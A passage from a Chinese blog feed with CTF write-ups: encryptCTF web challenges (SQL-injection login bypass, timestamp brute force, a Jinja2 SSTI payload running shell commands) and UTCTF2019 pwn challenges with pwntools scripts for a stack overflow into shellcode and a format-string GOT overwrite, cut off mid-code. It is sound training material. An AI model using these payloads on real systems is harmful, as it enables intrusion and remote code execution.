  # 成功登陆</span><br><span class="line">username=123&apos; or 1=2#&amp;password=123   # 登陆失败</span><br></pre></td></tr></table></figure><p>直接使用sqlmap跑出管理员密码，但是登陆后仍然是那个二维码，并没有flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+----------------------------------+ </span><br><span class="line">| id | username | password                         | </span><br><span class="line">+----+----------+----------------------------------+ </span><br><span class="line">| 1  | admin    | 21232f297a57a5a743894a0e4a801fc3 | </span><br><span class="line">+----+----------+----------------------------------+</span><br></pre></td></tr></table></figure><p>在数据库翻了半天，原来成功登陆的cookie就是flag，无语了。。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: SESSIONID=ZW5jcnlwdENURntpX0g0dDNfaW5KM2M3aTBuNX0%3D</span><br></pre></td></tr></table></figure><p>解码后为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encryptCTF&#123;i_H4t3_inJ3c7i0n5&#125;</span><br></pre></td></tr></table></figure><h3 id="Env"><a href="#Env" class="headerlink" title="Env"></a>Env</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Einstein said, &quot;time was relative, right?&quot;</span><br><span class="line"></span><br><span class="line">meme 1  https://i.imgur.com/LYS3TYi.jpg</span><br><span class="line">meme 2  https://i.imgur.com/FcsusMX</span><br><span class="line"></span><br><span class="line">http://104.154.106.182:6060</span><br><span class="line"></span><br><span class="line">Author: maskofmydisguise</span><br></pre></td></tr></table></figure><p>第一张图片里面提示了两个目录<code>/home</code>和<code>/whatsthetime/</code></p><p>访问<code>http://104.154.106.182:6060/whatsthetime</code>提示<code>Almost there...or are you?</code>。</p><p>然后访问<code>http://104.154.106.182:6060/whatsthetime/1</code>，获得一个新提示</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190403111245-5a530094-55be-1.png" alt=""></p><p>查了一下<code>THE EPOCH TIME</code>是指1970年1月1日00:00:00 UTC，猜测后面的数字要为当前时间的时间戳才能出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://104.154.106.182:6060/whatsthetime/'</span></span><br><span class="line">r = requests.get(url+str(int(time.time())))</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure><p>写了一个简单的脚本尝试一下，发现不行，估计服务器时间跟我本地有误差，最近决定拿burp进行爆破，我用当前时间戳减去100，然后每次加1进行爆破，很快就出结果了，如下图所示。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190403111303-64c9aed8-55be-1.png" alt=""></p><h3 id="repeaaaaaat"><a href="#repeaaaaaat" class="headerlink" title="repeaaaaaat"></a>repeaaaaaat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Can you repeaaaaaat?</span><br><span class="line"></span><br><span class="line">http://104.154.106.182:5050</span><br><span class="line"></span><br><span class="line">author: codacker</span><br></pre></td></tr></table></figure><p>访问链接后出现一大堆logo，查看源码发现了一串base64，<code>&lt;!-- d2hhdF9hcmVfeW91X3NlYXJjaGluZ19mb3IK --&gt;</code>，解码为<code>what_are_you_searching_for</code>。</p><p>然后访问<code>http://104.154.106.182:5050/what_are_you_searching_for</code>，又得到一串base64，解码后为一个视频链接<code>https://www.youtube.com/watch?v=5rAOyh7YmEc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Tue, 02 Apr 2019 13:22:51 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 429</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;main.css&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj01ckFPeWg3WW1FYwo= &lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>看完这个视频的我一脸懵逼，这是什么鬼？？？</p><p>迷惘几分钟后，发现返回包<code>server</code>字段比较陌生，Google一下<code>Gunicorn</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Gunicorn &apos;Green Unicorn&apos; is a Python WSGI HTTP Server for UNIX. It&apos;s a pre-fork worker model. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resources, and fairly speedy.</span><br></pre></td></tr></table></figure><p>可见这个网站是一个python站，看到python站，首先想到的是SSTI模板注入，简单测试了一下发现并没有反应</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190403111326-72b55d76-55be-1.png" alt=""></p><p>后面测试的时候发现主页下面的base64变了另外一个<code>&lt;!-- Lz9zZWNyZXQ9ZmxhZw== --&gt;</code>，解码为：<code>/?secret=flag</code>，然后再测试一下发现可行了。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190403111342-7c09c826-55be-1.png" alt=""></p><p>拿出一个常用的payload进行测试，返现返回500错误，但至少证明是成功运行了，可能本地的环境和远程的有些微差别。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">117</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('id').read()"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>一段一段地进行删除测试，发现的返回结果跟本地不一样</p><p>本地测试结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[-1].__subclasses__()[117]</span><br><span class="line">&lt;class &apos;os._wrap_close&apos;&gt;</span><br></pre></td></tr></table></figure><p>远程返回结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &apos;dict_valueiterator&apos;&gt;</span><br></pre></td></tr></table></figure><p>删掉序号直接查看返回结果，发现是存在这个class的</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190403111406-8a11f358-55be-1.png" alt=""></p><p>那么修改一下payload为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="string">'os._wrap_close'</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('id').read()"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>可正常返回结果。</p><p>最后payload为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="string">'os._wrap_close'</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('cat+flag*').read()"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于先知论坛 &lt;a href=&quot;https://xz.aliyun.com/t/4669&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4669&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;周中跟着大佬们打了一场国外的CTF
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>UTCTF2019-pwn-writeup</title>
    <link href="https://4f-kira.github.io/2019/05/31/UTCTF2019-pwn-writeup/"/>
    <id>https://4f-kira.github.io/2019/05/31/UTCTF2019-pwn-writeup/</id>
    <published>2019-05-31T02:27:00.000Z</published>
    <updated>2019-05-31T02:28:22.665Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知论坛 <a href="https://xz.aliyun.com/t/4423" target="_blank" rel="noopener">https://xz.aliyun.com/t/4423</a></p><h3 id="Baby-Pwn"><a href="#Baby-Pwn" class="headerlink" title="Baby Pwn"></a>Baby Pwn</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc stack.overflow.fail 9000</span><br></pre></td></tr></table></figure><p>检查保护情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/utctf/babypwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>可以看到什么保护都没开，这种情况一般优先考虑写shellcode的方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  welcome();</span><br><span class="line">  do_calc();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Goodbye %s\n"</span>, &amp;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数比较简单，一个welcome函数和一个calc函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">welcome</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to the UT calculator service"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  gets(&amp;name);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, &amp;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数要求我们输入一个name，name存放在bss段，程序没有开PIE，地址可知，那么我们可以在这里写入shellcode。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+40h] [rbp-50h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+8Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter an operation (+ - *): "</span>);</span><br><span class="line">  v5 = getchar();</span><br><span class="line">  flush_stdin();</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="string">'*'</span> &amp;&amp; v5 != <span class="string">'+'</span> &amp;&amp; v5 != <span class="string">'-'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"That's not a valid operation!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the first operand: "</span>);</span><br><span class="line">  gets(&amp;nptr);</span><br><span class="line">  v4 = atol(&amp;nptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the second operand: "</span>);</span><br><span class="line">  gets(&amp;v1);</span><br><span class="line">  v3 = atol(&amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">43</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"The sum is: %ld\n"</span>, v4 + v3);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="string">'-'</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"The difference is: %ld\n"</span>, v4 - v3);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="string">'*'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"How did I get here?"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Exiting.."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"The product is: %ld\n"</span>, v3 * v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两个溢出点，都是输入运算数的地方，我这里选择<code>gets(&amp;v1)</code>作为溢出点，只要填充0x98个字符就可以覆盖ret了，这里需要需注意一下，程序会判断运算符是否为<code>+ - *</code>，如果不是就会<code>exit</code>，所以我们填充垃圾数据的时候注意不能把运算符（<code>v5</code>）改成其他字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'stack.overflow.fail'</span>,<span class="number">9000</span>)</span><br><span class="line">name_addr = <span class="number">0x601080</span></span><br><span class="line">p.sendlineafter(<span class="string">'name?\n'</span>,asm(shellcraft.sh())) </span><br><span class="line">p.sendline(<span class="string">'+'</span>)</span><br><span class="line">p.sendline(<span class="string">'123'</span>)</span><br><span class="line">p.sendline(<span class="string">'+'</span>*<span class="number">0x98</span>+p64(name_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="BabyEcho"><a href="#BabyEcho" class="headerlink" title="BabyEcho"></a>BabyEcho</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I found this weird echo server. Can you find a vulnerability?</span><br><span class="line"></span><br><span class="line">nc stack.overflow.fail 9002</span><br></pre></td></tr></table></figure><p>检查保护情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/utctf/BabyEcho&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序比较简单，没有栈溢出，不过有一个很明显的格式化字符串漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ah] [ebp-3Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me a string to echo back."</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个坑，<code>s</code>的地址不是4字节最齐，动态调试一下会看得更清楚，在<code>0x08048593</code>处下一个断点，gdb调试一下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313083636-0eee65d6-4528-1.png" alt=""></p><p>由上图可见，有两个<code>a</code>是在<code>0xffffd458</code>处，所以我们格式化字符串进行任意地址写的时候，要注意填充两个字节以确保地址对齐。</p><p>思路整理：</p><ol><li>由于题目不是while循环，第一步要先把<code>exit@got.plt</code>改成<code>main</code>，令程序进入死循环</li><li>动态调试的时候发现栈中有<code>_IO_2_1_stdin_</code>的地址，可以用于泄露libc基址</li><li>把<code>printf@got.plt</code>改成<code>system</code>，之后再次输入<code>/bin/sh</code>即可getshell。由于出题人没有给libc，尝试了好几个libc版本，才打远程成功，最后确认libc版本为<code>libc6-i386_2.23-0ubuntu10_amd64.so</code>。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'stack.overflow.fail'</span>,<span class="number">9002</span>)</span><br><span class="line">elf = ELF(<span class="string">'./BabyEcho'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="comment"># overwrite exit@got.plt</span></span><br><span class="line">main_addr = <span class="number">0x804851B</span></span><br><span class="line">exit_got =  <span class="number">0x804A01C</span></span><br><span class="line">byte1 = main_addr &amp; <span class="number">0xff</span></span><br><span class="line">byte2 = (main_addr &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hhn'</span>.format(byte1,<span class="number">11</span>+<span class="number">8</span>)</span><br><span class="line">payload +=  <span class="string">'%&#123;&#125;c%&#123;&#125;$hhn'</span>.format(byte2-byte1,<span class="number">11</span>+<span class="number">9</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">34</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p32(exit_got)+p32(exit_got+<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'back.\n'</span>,payload)</span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">p.sendlineafter(<span class="string">'back.\n'</span>,<span class="string">'%2$p'</span>)</span><br><span class="line">libc.address = int(p.readline(),<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line"><span class="comment"># overwrite printf@got.plt</span></span><br><span class="line">system_addr = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">byte1 = system_addr &amp; <span class="number">0xff</span></span><br><span class="line">byte2 = (system_addr &amp; <span class="number">0xffff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hhn'</span>.format(byte1,<span class="number">11</span>+<span class="number">8</span>)</span><br><span class="line">payload +=  <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(byte2-byte1,<span class="number">11</span>+<span class="number">9</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">34</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">'printf'</span>])+p32(elf.got[<span class="string">'printf'</span>]+<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'back.\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="PPower-enCryption"><a href="#PPower-enCryption" class="headerlink" title="PPower enCryption"></a>PPower enCryption</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc stack.overflow.fail 9001</span><br></pre></td></tr></table></figure><p>检查保护情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/utctf/ppc&apos;</span><br><span class="line">    Arch:     powerpc64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x10000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h3 id="Encryption-Service"><a href="#Encryption-Service" class="headerlink" title="Encryption Service"></a>Encryption Service</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc stack.overflow.fail 9004</span><br></pre></td></tr></table></figure><p>检查保护情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/utctf/Encryption_Service&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your user id?"</span>);</span><br><span class="line">  v3 = <span class="string">"%d%*c"</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d%*c"</span>, &amp;user_id);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu(v3);</span><br><span class="line">    v3 = <span class="string">"%d%*c"</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d%*c"</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        encrypt_string();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        remove_encrypted_string();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        view_messages();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit_encrypted_message();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v3 = <span class="string">"Not a valid option"</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Not a valid option"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span 